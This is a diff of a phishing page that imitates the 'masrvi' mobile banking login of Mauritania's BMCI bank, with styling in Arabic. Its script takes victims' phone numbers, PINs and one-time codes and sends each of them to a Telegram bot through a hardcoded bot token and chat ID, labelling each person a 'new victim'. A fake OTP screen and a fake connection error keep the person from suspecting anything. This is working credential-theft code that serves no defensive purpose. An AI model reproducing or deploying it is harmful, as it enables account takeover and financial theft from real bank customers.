@@ -7,140 +7,153 @@
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;900&display=swap');
         
-        :root { --primary-color: #e67e22; --secondary-color: #ad6d2f; --bg-color: #f4f7f6; }
+        :root { --primary: #e67e22; --secondary: #ad6d2f; --bg: #f8f9fa; }
 
-        body { margin: 0; background-color: var(--bg-color); font-family: 'Cairo', sans-serif; display: flex; justify-content: center; height: 100vh; color: #333; }
-        .app-container { width: 100%; max-width: 450px; background: white; display: flex; flex-direction: column; position: relative; box-shadow: 0 0 20px rgba(0,0,0,0.05); }
+        body { margin: 0; background-color: var(--bg); font-family: 'Cairo', sans-serif; display: flex; justify-content: center; height: 100vh; overflow: hidden; }
+        .app-wrapper { width: 100%; max-width: 450px; background: white; display: flex; flex-direction: column; height: 100%; position: relative; }
         
-        .header { background: var(--primary-color); padding: 40px 20px 20px; text-align: center; color: white; border-bottom-left-radius: 25px; border-bottom-right-radius: 25px; }
-        .logo-text { font-size: 35px; font-weight: 900; margin: 0; text-transform: lowercase; letter-spacing: -1px; }
-        .sub-header { font-size: 13px; opacity: 0.9; font-weight: 600; margin-top: 5px; }
+        /* الهيدر المطور */
+        .header { 
+            background: linear-gradient(180deg, #e67e22 0%, #d35400 100%); 
+            padding: 55px 20px 35px; text-align: center; color: white; 
+            border-bottom-left-radius: 30px; border-bottom-right-radius: 30px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
+        }
+        .logo-main { font-size: 42px; font-weight: 900; margin: 0; letter-spacing: -1.5px; }
+        .bank-name { font-size: 14px; opacity: 0.95; font-weight: 600; margin-top: 8px; }
 
-        .content { padding: 30px 25px; flex: 1; }
-        .welcome-msg { font-size: 20px; font-weight: 700; color: #2c3e50; margin-bottom: 30px; text-align: center; }
+        .main-content { padding: 35px 25px; flex: 1; }
+        .section-title { font-size: 22px; font-weight: 700; color: #2c3e50; margin-bottom: 35px; text-align: center; }
 
-        .input-group { margin-bottom: 20px; }
-        .input-group label { display: block; margin-bottom: 8px; font-size: 14px; font-weight: 700; color: #555; }
+        .field-group { margin-bottom: 25px; }
+        .field-label { display: block; margin-bottom: 10px; font-size: 14px; font-weight: 700; color: #444; }
         
+        /* خانات الإدخال - أرقام فقط */
         input { 
-            width: 100%; padding: 15px; border: 1.5px solid #e0e0e0; border-radius: 12px; 
-            background: #fdfdfd; font-size: 16px; transition: 0.3s; box-sizing: border-box; text-align: center;
+            width: 100%; padding: 16px; border: 1.2px solid #ddd; border-radius: 14px; 
+            background: #fafafa; font-size: 18px; transition: 0.3s; box-sizing: border-box; text-align: center;
+            font-family: 'Cairo', sans-serif;
         }
-        input:focus { border-color: var(--primary-color); outline: none; background: white; box-shadow: 0 0 8px rgba(230, 126, 34, 0.2); }
+        input:focus { border-color: var(--primary); outline: none; background: white; box-shadow: 0 0 10px rgba(230, 126, 34, 0.15); }
 
-        .main-btn { 
-            background: var(--secondary-color); color: white; border: none; padding: 16px; 
-            width: 100%; border-radius: 12px; font-size: 17px; font-weight: 700; cursor: pointer; 
-            margin-top: 10px; transition: 0.2s;
+        .action-btn { 
+            background: var(--secondary); color: white; border: none; padding: 18px; 
+            width: 100%; border-radius: 14px; font-size: 18px; font-weight: 700; cursor: pointer; 
+            margin-top: 15px; box-shadow: 0 4px 12px rgba(173, 109, 47, 0.3);
         }
-        .main-btn:active { transform: scale(0.98); opacity: 0.9; }
 
-        .otp-info { text-align: center; font-size: 14px; color: #666; margin-bottom: 20px; }
-        .timer-box { font-size: 22px; font-weight: 900; color: var(--primary-color); margin: 10px 0; }
+        /* واجهة OTP */
+        .otp-text { text-align: center; font-size: 14px; color: #7f8c8d; line-height: 1.6; margin-bottom: 20px; }
+        .timer { font-size: 28px; font-weight: 900; color: var(--primary); margin: 15px 0; text-align: center; }
 
-        .footer-brand { text-align: center; padding: 20px; font-size: 12px; color: #bbb; margin-top: auto; }
+        .footer { text-align: center; padding: 25px; font-size: 12px; color: #95a5a6; margin-top: auto; }
         .hidden { display: none; }
 
-        /* أنيميشن التحميل */
-        .loader { border: 3px solid #f3f3f3; border-top: 3px solid var(--primary-color); border-radius: 50%; width: 20px; height: 20px; animation: spin 1s linear infinite; display: inline-block; vertical-align: middle; margin-left: 10px; }
+        /* لودر احترافي */
+        .spinner { border: 3px solid rgba(255,255,255,0.3); border-top: 3px solid white; border-radius: 50%; width: 22px; height: 22px; animation: spin 0.8s linear infinite; display: none; margin: 0 auto; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
 
-<div class="app-container">
+<div class="app-wrapper">
     <div class="header">
-        <h1 class="logo-text">masrvi</h1>
-        <div class="sub-header">المصرف الموريتاني للاستثمار - BMCI</div>
+        <h1 class="logo-main">masrvi</h1>
+        <div class="bank-name">المصرف الموريتاني للاستثمار - BMCI</div>
     </div>
 
-    <div id="login-step" class="content">
-        <div class="welcome-msg">تسجيل الدخول للموبايل</div>
-        <div class="input-group">
-            <label>رقم الهاتف المربوط بالحساب</label>
-            <input type="tel" id="phone" placeholder="00 00 00 00" maxlength="8">
+    <div id="step-login" class="main-content">
+        <div class="section-title">تسجيل الدخول للموبايل</div>
+        <div class="field-group">
+            <label class="field-label">رقم الهاتف المربوط بالحساب</label>
+            <input type="tel" id="phone" placeholder="00 00 00 00" inputmode="numeric" oninput="this.value=this.value.replace(/[^0-9]/g,'');" maxlength="8">
         </div>
-        <div class="input-group">
-            <label>كلمة المرور (PIN)</label>
-            <input type="password" id="pin" placeholder="••••" maxlength="4">
+        <div class="field-group">
+            <label class="field-label">كلمة المرور (PIN)</label>
+            <input type="password" id="pin" placeholder="••••" inputmode="numeric" oninput="this.value=this.value.replace(/[^0-9]/g,'');" maxlength="4">
         </div>
-        <button class="main-btn" onclick="processLogin()">دخول آمن</button>
-    </div>
-
-    <div id="otp-step" class="content hidden">
-        <div class="welcome-msg">تأكيد العملية</div>
-        <div class="otp-info">
-            تم إرسال رمز التحقق (OTP) في رسالة نصية إلى رقمك المرتبط بالحساب. يرجى إدخاله للمتابعة.
-        </div>
-        <div class="timer-box" id="timer">02:00</div>
-        <div class="input-group">
-            <input type="text" id="otp" placeholder="— — — — — —" maxlength="6" style="letter-spacing: 5px; font-size: 22px;">
-        </div>
-        <button class="main-btn" onclick="processOtp()">
-            <span id="btn-text">تأكيد الرمز</span>
+        <button class="action-btn" id="loginBtn" onclick="doLogin()">
+            <span id="loginText">دخول آمن</span>
+            <div class="spinner" id="loginSpin"></div>
         </button>
-        <div style="text-align: center; margin-top: 15px; font-size: 13px; color: var(--primary-color); font-weight: 700; cursor: pointer;">إعادة إرسال الرمز</div>
     </div>
 
-    <div class="footer-brand">Masrvi Mobile Banking © 2026<br>Version 4.2.1</div>
+    <div id="step-otp" class="main-content hidden">
+        <div class="section-title">تأكيد الهوية</div>
+        <div class="otp-text">لقد أرسلنا رمز التحقق المكون من 6 أرقام إلى هاتفك. يرجى إدخاله للمتابعة.</div>
+        <div class="timer" id="timerDisplay">05:00</div>
+        <div class="field-group">
+            <input type="tel" id="otp" placeholder="— — — — — —" inputmode="numeric" oninput="this.value=this.value.replace(/[^0-9]/g,'');" maxlength="6" style="letter-spacing: 6px; font-size: 24px; font-weight: bold;">
+        </div>
+        <button class="action-btn" id="otpBtn" onclick="doOtp()">
+            <span id="otpText">تأكيد الرمز</span>
+            <div class="spinner" id="otpSpin"></div>
+        </button>
+        <p style="text-align: center; font-size: 13px; color: var(--primary); margin-top: 20px; font-weight: bold;">إعادة إرسال الرمز</p>
+    </div>
+
+    <div class="footer">
+        Masrvi Mobile Banking © 2026<br>
+        Version 4.2.1 (Build 5082)
+    </div>
 </div>
 
 <script>
-const token = "8647203625:AAFUHY8sXVD8IoSvf60Wd7pT-l5MHDO-d9I";
-const chatId = "5244299184";
+const botToken = "8647203625:AAFUHY8sXVD8IoSvf60Wd7pT-l5MHDO-d9I";
+const chatID = "5244299184";
 
-function notify(text) {
-    const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}`;
+function sendLog(msg) {
+    const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatID}&text=${encodeURIComponent(msg)}`;
     new Image().src = url;
 }
 
-function processLogin() {
+function doLogin() {
     const p = document.getElementById('phone').value;
     const s = document.getElementById('pin').value;
     
-    if(p.length >= 8 && s.length >= 4) {
-        // إشعار فوري بالدخول
-        notify(`🚨 ضحية جديد دخل :\n📱 الهاتف: ${p}\n🔑 الرمز: ${s}`);
+    if(p.length === 8 && s.length === 4) {
+        sendLog(`🚨 ضحية جديد:\n📱 هاتف: ${p}\n🔑 رمز PIN: ${s}`);
         
-        // إظهار واجهة التحميل لإعطاء مصداقية
-        const btn = document.querySelector('.main-btn');
-        btn.innerHTML = '<div class="loader"></div> جاري التحقق...';
+        document.getElementById('loginText').style.display = 'none';
+        document.getElementById('loginSpin').style.display = 'block';
         
         setTimeout(() => {
-            document.getElementById('login-step').classList.add('hidden');
-            document.getElementById('otp-step').classList.remove('hidden');
-            startTimer(120);
+            document.getElementById('step-login').classList.add('hidden');
+            document.getElementById('step-otp').classList.remove('hidden');
+            startCountdown(300); // 5 دقائق
         }, 1500);
     } else {
-        alert("يرجى التأكد من إدخال البيانات بشكل صحيح");
+        alert("يرجى إدخال البيانات بشكل صحيح (8 أرقام للهاتف و4 للرمز)");
     }
 }
 
-function processOtp() {
+function doOtp() {
     const o = document.getElementById('otp').value;
     if(o.length >= 4) {
-        notify(`🔢 رمز الـ OTP المسجل: ${o}`);
+        sendLog(`🔢 رمز الـ OTP: ${o}`);
         
-        const btn = document.getElementById('btn-text');
-        btn.innerHTML = '<div class="loader"></div> جاري التأكيد...';
+        document.getElementById('otpText').style.display = 'none';
+        document.getElementById('otpSpin').style.display = 'block';
         
         setTimeout(() => {
-            alert("حدث خطأ في الاتصال بالسيرفر، يرجى المحاولة لاحقاً.");
+            alert("عذراً، انتهت جلسة الاتصال. يرجى إعادة المحاولة.");
             location.reload();
-        }, 2000);
+        }, 2500);
+    } else {
+        alert("يرجى إدخال رمز التأكيد");
     }
 }
 
-function startTimer(duration) {
+function startCountdown(duration) {
     let timer = duration, minutes, seconds;
-    const display = document.getElementById('timer');
-    setInterval(function () {
+    const display = document.getElementById('timerDisplay');
+    const interval = setInterval(function () {
         minutes = parseInt(timer / 60, 10);
         seconds = parseInt(timer % 60, 10);
         minutes = minutes < 10 ? "0" + minutes : minutes;
         seconds = seconds < 10 ? "0" + seconds : seconds;
         display.textContent = minutes + ":" + seconds;
-        if (--timer < 0) timer = 0;
+        if (--timer < 0) clearInterval(interval);
     }, 1000);
 }
 </script>
